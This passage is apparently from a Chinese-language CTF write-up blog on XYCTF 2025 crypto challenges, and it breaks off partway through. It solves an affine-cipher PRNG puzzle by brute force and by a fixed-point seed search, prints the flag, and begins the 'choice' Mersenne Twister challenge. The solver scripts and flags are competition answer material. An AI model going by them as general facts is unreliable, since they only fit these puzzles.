style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">9</span><span class="mord">1</span><span class="mord">9</span><span class="mord">8</span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span></span></span><span style="top:-0.00999999999999951em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">爆</span><span class="mord cjk_fallback">破</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:1.1899999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">旦</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">后</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">了</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:4.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>所以编写如下爆破脚本，得到符合要求的式子为：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(isPrime(<span class="number">19198111</span>))</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = [<span class="number">18448965</span>, <span class="number">18448965</span>, <span class="number">6443888</span>, <span class="number">8841566</span>, <span class="number">18448965</span>, <span class="number">6443888</span>, <span class="number">18549087</span>, <span class="number">6544010</span>, <span class="number">4112958</span>, <span class="number">16151409</span>, <span class="number">13753731</span>, <span class="number">4129645</span>, <span class="number">1731967</span>, <span class="number">6544010</span>, <span class="number">18532400</span>, <span class="number">13720357</span>, <span class="number">6544010</span>, <span class="number">11322679</span>, <span class="number">11322679</span>, <span class="number">1731967</span>, <span class="number">13753731</span>, <span class="number">6560697</span>, <span class="number">18532400</span>, <span class="number">1748654</span>, <span class="number">16151409</span>, <span class="number">8925001</span>, <span class="number">1731967</span>, <span class="number">16118035</span>, <span class="number">11322679</span>, <span class="number">18448965</span>, <span class="number">18432278</span>, <span class="number">18448965</span>, <span class="number">18432278</span>, <span class="number">16034600</span>, <span class="number">18448965</span>, <span class="number">16051287</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="built_in">list</span> = []</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        d = gmpy2.invert(i-j,<span class="number">19198111</span>)</span><br><span class="line">        a1 = ( (flag[<span class="number">1</span>]-flag[<span class="number">2</span>]) * d) % <span class="number">19198111</span></span><br><span class="line">        b1 = ( flag[<span class="number">1</span>]- a1 * i) % <span class="number">19198111</span></span><br><span class="line">        d2 = gmpy2.invert(a1,<span class="number">19198111</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">            x = ((flag[k]-b1)*d2) % <span class="number">19198111</span></span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="built_in">len</span>(table):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">                <span class="comment">#print(x)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result += table[x]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">   <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(result))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406154228927.png" alt="image-20250406154228927"></p><ul><li>其中<code>flag</code>为第二个式子即：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span><br></pre></td></tr></table></figure><h3 id="正常解"><a class="markdownIt-Anchor" href="#正常解"></a> 正常解</h3><ul><li>赛后出题人没有给<code>exp</code>，但是有提一嘴这题的思路，这题的思路是不动点法，打算也来使用正常方法打一下。</li><li>先来介绍一下不动点：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415103513403.png" alt="image-20250415103513403"></p><ul><li>不动点也可以理解为函数与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">f(x)=x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span>的交点。我们先来查看程序伪随机数生成的逻辑。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            <span class="keyword">assert</span> x &lt; <span class="number">19198111</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><ul><li>这题不能找到直接的不动点，但是可以找到一个种子，利用该种子生成的随机数只有两种可能。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;testflag&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        y = random.randint(self.a, self.b)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">        random.seed(y ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        z = random.randint(self.a, self.b)</span><br><span class="line">        <span class="built_in">print</span>(z)</span><br><span class="line">        <span class="keyword">return</span> x,z</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    seed = i</span><br><span class="line">    prng = PRNG(seed)</span><br><span class="line">    x,z = prng.<span class="built_in">next</span>()</span><br><span class="line">    <span class="keyword">if</span> x==z:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;seed =&#x27;</span>,i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># seed = 10701913</span></span><br></pre></td></tr></table></figure><ul><li>此时我们使用<code>rand,randint()</code>这个函数只会生成两个数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17593903</span></span><br><span class="line"><span class="number">7234044</span></span><br></pre></td></tr></table></figure><ul><li>然后我们进行<code>nc</code>连接，然后输入<code>seed = 10701913</code>，此时我们就可以得到密文</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415152820411.png" alt="image-20250415152820411"></p><ul><li>此时我们<code>a、b</code>组合就只有<code>4</code>种可能，此时我们就可以很快得到正确的<code>a、b</code>的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">c = [<span class="number">18201575</span>, <span class="number">18201575</span>, <span class="number">13388951</span>, <span class="number">11784743</span>, <span class="number">18201575</span>, <span class="number">13388951</span>, <span class="number">18411115</span>, <span class="number">13598491</span>, <span class="number">8733482</span>, <span class="number">817212</span>, <span class="number">2421420</span>, <span class="number">2369035</span>, <span class="number">3973243</span>, <span class="number">13598491</span>, <span class="number">5577451</span>, <span class="number">15150314</span>, <span class="number">13598491</span>, <span class="number">16754522</span>, <span class="number">16754522</span>, <span class="number">3973243</span>, <span class="number">2421420</span>, <span class="number">7234044</span>, <span class="number">5577451</span>, <span class="number">16806907</span>, <span class="number">817212</span>, <span class="number">18358730</span>, <span class="number">3973243</span>, <span class="number">13546106</span>, <span class="number">16754522</span>, <span class="number">18201575</span>, <span class="number">5367911</span>, <span class="number">18201575</span>, <span class="number">5367911</span>, <span class="number">6972119</span>, <span class="number">18201575</span>, <span class="number">607672</span>]</span><br><span class="line">a = <span class="number">17593903</span></span><br><span class="line">b = <span class="number">7234044</span></span><br><span class="line"></span><br><span class="line">m = <span class="number">19198111</span></span><br><span class="line">d = gmpy2.invert(a, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="built_in">print</span>(table[((i-b)*d)%m],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415153454413.png" alt="image-20250415153454413"></p><ul><li>flag：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span><br></pre></td></tr></table></figure><h2 id="choice"><a class="markdownIt-Anchor" href="#choice"></a> choice</h2><ul><li>这题的题目给了三个附件<code>choice.py</code>、<code>random.py</code>、<code>output.py</code></li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415154450064.png" alt="image-20250415154450064"></p><ul><li>其中<code>random.py</code>其实就是Python中实现随机数的库，而<code>choice.py</code>其实就是加密的代码，最后一个<code>output.py</code>是输出后的密文</li><li>接下来我们来看一下<code>choice</code>这个代码:<ul><li><code>test</code>生成的是一个字节串，按照<code>255-0</code>的顺序生成的字符串其具体形式如下图所示</li><li>发现还是使用的<code>rand.getrandbits</code>这个函数（与Division这题一样的函数），生成与<code>msg</code>长度一样的随机数，将它与<code>msg</code>进行异或操作</li><li>之后使用<code>rand.choice(test)</code>选择这个字节串中的其中一个索引数据，选择了<code>2496</code>次</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250415155233835.png" alt="image-20250415155233835"></p><ul><li>接下来我们查看输出</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">r = [<span class="number">224</span>, <span class="number">55</span>, <span class="number">218</span>, <span class="number">253</span>, <span class="number">150</span>, <span class="number">84</span>, <span class="number">208</span>, <span class="number">134</span>, <span class="number">18</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">54</span>, <span class="number">122</span>, <span class="number">193</span>, <span class="number">249</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">80</span>, <span class="number">230</span>, <span class="number">21</span>, <span class="number">236</span>, <span class="number">33</span>, <span class="number">226</span>, <span class="number">3</span>, <span class="number">120</span>, <span class="number">141</span>, <span class="number">212</span>, <span class="number">33</span>, <span class="number">69</span>, <span class="number">195</span>, <span class="number">78</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">197</span>, <span class="number">10</span>, <span class="number">224</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">17</span>, <span class="number">112</span>, <span class="number">196</span>, <span class="number">143</span>, <span class="number">209</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">198</span>, <span class="number">174</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">118</span>, <span class="number">175</span>, <span class="number">145</span>, <span class="number">111</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">206</span>, <span class="number">137</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">252</span>, <span class="number">84</span>, <span class="number">18</span>, <span class="number">145</span>, <span class="number">81</span>, <span class="number">124</span>, <span class="number">202</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">144</span>, <span class="number">200</span>, <span class="number">13</span>, <span class="number">230</span>, <span class="number">218</span>, <span class="number">208</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">101</span>, <span class="number">211</span>, <span class="number">114</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">190</span>, <span class="number">226</span>, <span class="number">62</span>, <span class="number">118</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">118</span>, <span class="number">245</span>, <span class="number">196</span>, <span class="number">4</span>, <span class="number">92</span>, <span class="number">251</span>, <span class="number">238</span>, <span class="number">142</span>, <span class="number">114</span>, <span class="number">13</span>, <span class="number">113</span>, <span class="number">247</span>, <span class="number">171</span>, <span class="number">8</span>, <span class="number">138</span>, <span class="number">20</span>, <span class="number">169</span>, <span class="number">192</span>, <span class="number">221</span>, <span class="number">223</span>, <span class="number">60</span>, <span class="number">56</span>, <span class="number">188</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">202</span>, <span class="number">195</span>, <span class="number">246</span>, <span class="number">71</span>, <span class="number">235</span>, <span class="number">152</span>, <span class="number">255</span>, <span class="number">73</span>, <span class="number">128</span>, <span class="number">140</span>, <span class="number">159</span>, <span class="number">119</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">223</span>, <span class="number">239</span>, <span class="number">242</span>, <span class="number">60</span>, <span class="number">228</span>, <span class="number">205</span>, <span class="number">90</span>, <span class="number">210</span>, <span class="number">5</span>, <span class="number">165</span>, <span class="number">35</span>, <span class="number">176</span>, <span class="number">75</span>, <span class="number">21</span>, <span class="number">182</span>, <span class="number">220</span>, <span class="number">212</span>, <span class="number">240</span>, <span class="number">212</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">52</span>, <span class="number">140</span>, <span class="number">85</span>, <span class="number">200</span>, <span class="number">207</span>, <span class="number">31</span>, <span class="number">177</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">152</span>, <span class="number">128</span>, <span class="number">124</span>, <span class="number">205</span>, <span class="number">216</span>, <span class="number">252</span>, <span class="number">34</span>, <span class="number">27</span>, <span class="number">198</span>, <span class="number">186</span>, <span class="number">61</span>, <span class="number">161</span>, <span class="number">192</span>, <span class="number">158</span>, <span class="number">226</span>, <span class="number">40</span>, <span class="number">127</span>, <span class="number">69</span>, <span class="number">162</span>, <span class="number">24</span>, <span class="number">46</span>, <span class="number">208</span>, <span class="number">183</span>, <span class="number">99</span>, <span class="number">165</span>, <span class="number">1</span>, <span class="number">221</span>, <span class="number">184</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">136</span>, <span class="number">236</span>, <span class="number">245</span>, <span class="number">228</span>, <span class="number">197</span>, <span class="number">86</span>, <span class="number">15</span>, <span class="number">201</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">18</span>, <span class="number">131</span>, <span class="number">79</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">122</span>, <span class="number">63</span>, <span class="number">200</span>, <span class="number">192</span>, <span class="number">244</span>, <span class="number">205</span>, <span class="number">229</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">170</span>, <span class="number">5</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">33</span>, <span class="number">214</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">105</span>, <span class="number">233</span>, <span class="number">115</span>, <span class="number">230</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">84</span>, <span class="number">39</span>, <span class="number">167</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">236</span>, <span class="number">104</span>, <span class="number">225</span>, <span class="number">196</span>, <span class="number">181</span>, <span class="number">105</span>, <span class="number">180</span>, <span class="number">159</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">201</span>, <span class="number">212</span>, <span class="number">175</span>, <span class="number">203</span>, <span class="number">200</span>, <span class="number">19</span>, <span class="number">99</span>, <span class="number">24</span>, <span class="number">112</span>, <span class="number">180</span>, <span class="number">75</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">204</span>, <span class="number">13</span>, <span class="number">210</span>, <span class="number">165</span>, <span class="number">135</span>, <span class="number">175</span>, <span class="number">132</span>, <span class="number">205</span>, <span class="number">247</span>, <span class="number">28</span>, <span class="number">178</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">196</span>, <span class="number">240</span>, <span class="number">121</span>, <span class="number">132</span>, <span class="number">21</span>, <span class="number">8</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">143</span>, <span class="number">206</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">47</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">35</span>, <span class="number">63</span>, <span class="number">168</span>, <span class="number">251</span>, <span class="number">11</span>, <span class="number">254</span>, <span class="number">11</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">184</span>, <span class="number">114</span>, <span class="number">88</span>, <span class="number">194</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">44</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">42</span>, <span class="number">234</span>, <span class="number">112</span>, <span class="number">100</span>, <span class="number">248</span>, <span class="number">247</span>, <span class="number">66</span>, <span class="number">221</span>, <span class="number">72</span>, <span class="number">229</span>, <span class="number">236</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">203</span>, <span class="number">65</span>, <span 